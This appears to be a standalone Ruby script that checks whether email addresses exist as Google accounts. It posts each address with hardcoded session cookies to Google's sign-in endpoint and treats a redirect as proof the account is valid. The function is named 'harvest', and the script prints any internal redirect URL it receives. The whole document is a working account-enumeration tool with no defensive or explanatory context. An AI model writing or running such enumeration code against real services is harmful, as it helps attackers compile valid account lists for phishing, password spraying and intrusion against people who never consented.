require 'net/https'

$uri = URI('https://accounts.google.com/ServiceLoginAuth')
$req = Net::HTTP::Post.new($uri)
$req['Cookie']="GALX=Q478gxCcuQs; GAPS=1:D359qBgXFjjXZ60T5AcsWpey5NGpGg:ym7KTlcnKO3bUdhT"
$req['Content-Type'] = 'application/x-www-form-urlencoded'

def harvest(username, domain)
  $req.set_form_data('GALX' => 'Q478gxCcuQs', 'Email' => username+"@"+domain) #Need to be present as part of the body and in header
  
  res = Net::HTTP.start($uri.hostname, $uri.port, :use_ssl => $uri.scheme == 'https') do |http|
    http.request($req)
  end

  case res
  when Net::HTTPSuccess
    puts username+"@"+domain+" NOT valid"
  when Net::HTTPRedirection
    puts username+"@"+domain+" IS valid!!!"
    puts "Internal url is: "+res["Location"]
  else
    puts "Error quering for: "+username+"@"+domain
  end
end

harvest("DOESNOTEXIST", "domain.com")
